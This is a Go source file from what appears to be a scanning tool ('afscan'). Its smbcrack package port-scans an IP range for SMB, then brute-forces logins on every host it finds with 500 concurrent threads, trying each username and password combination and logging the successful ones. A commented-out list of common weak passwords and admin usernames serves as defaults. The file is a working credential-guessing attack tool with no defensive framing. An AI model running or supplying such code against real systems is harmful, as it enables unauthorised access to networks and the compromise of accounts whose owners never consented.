package smbcrack

import (
	"afscan/portscan2"
	"fmt"
	"log"
	"strconv"
	"strings"
	"sync"

	"github.com/stacktitan/smb/smb"
)

type Task struct {
	ip   string
	user string
	pass string
}

func Main(ip string, ports string, t int, timeout int64, User string, Password string) {
	var tasks []Task
	var ips, user1, pass1 []string
	//t := 500
	//ip := "192.168.56-201.1-255"
	//ports := "445"
	ips = portscan2.PortScan(ip, ports, t, timeout)

	fmt.Println(ips)

	countSplit := strings.Split(User, ",")
	for _, user := range countSplit {
		user1 = append(user1, user)
	}
	countSplit1 := strings.Split(Password, ",")
	for _, pass := range countSplit1 {
		pass1 = append(pass1, pass)
	}

	//User := []string{"administrator", "admin", "test1"}
	//Password := []string{"123456", "Aufeng123", "admin", "admin123", "root", "", "pass123", "pass@123", "password", "123123", "654321", "111111", "123", "1", "admin@123", "Admin@123", "admin123!@#", "P@ssw0rd!", "P@ssw0rd", "Passw0rd", "qwe123", "12345678", "test", "test123", "123qwe!@#", "123456789", "123321", "666666", "a123456.", "123456~a", "123456!a", "000000", "1234567890", "8888888", "!QAZ2wsx", "1qaz2wsx", "abc123", "abc123456", "1qaz@WSX", "a11111", "a12345", "Aa1234", "Aa1234.", "Aa12345", "a123456", "a123123", "Aa123123", "Aa123456", "Aa12345.", "sysadmin", "system", "1qaz!QAZ", "2wsx@WSX", "qwe123!@#", "Aa123456!", "A123456s!", "sa123456", "1q2w3e"}

	for _, ip := range ips {
		for _, user := range user1 {
			for _, pass := range pass1 {
				tasks = append(tasks, Task{ip, user, pass})
			}
		}
	}

	test(tasks, 500)
}

var wg sync.WaitGroup

func test(tasks []Task, threads int) {
	taskCh := make(chan Task, threads*2)
	for i := 0; i < threads; i++ {
		go func() {
			for task := range taskCh {
				if smbconnect(task.ip, task.user, task.pass) {
					log.Printf("success %v %v %v\n", task.ip, task.user, task.pass)
				}
				wg.Done()
			}
		}()
	}
	for _, task := range tasks {
		wg.Add(1)
		taskCh <- task
	}
	wg.Wait()
	close(taskCh)
}

func smbconnect(ip string, User string, Password string) bool {
	res := false
	host := strings.Split(ip, ":")[0]
	port, err := strconv.Atoi(strings.Split(ip, ":")[1])
	if err != nil {
		panic(err)
	}

	//host := "192.168.201.132"
	options := smb.Options{
		Host:        host,
		Port:        port,
		User:        User,
		Domain:      "",
		Workstation: "",
		Password:    Password,
	}
	debug := false
	session, _ := smb.NewSession(options, debug)
	/*
		if err != nil {
			log.Fatalln("[!]", err)
		}
	*/

	defer session.Close()
	/*
		if session.IsSigningRequired {
			log.Println("[-] Signing is required")
		} else {
			log.Println("[+] Signing is NOT required")
		}
	*/
	if session.IsAuthenticated {
		//log.Println(ip, User, Password+"[+] Login successful")
		res = true
	} else {
		//log.Println(ip, User, Password+"[-] Login failed")
		return res
	}
	return res
}
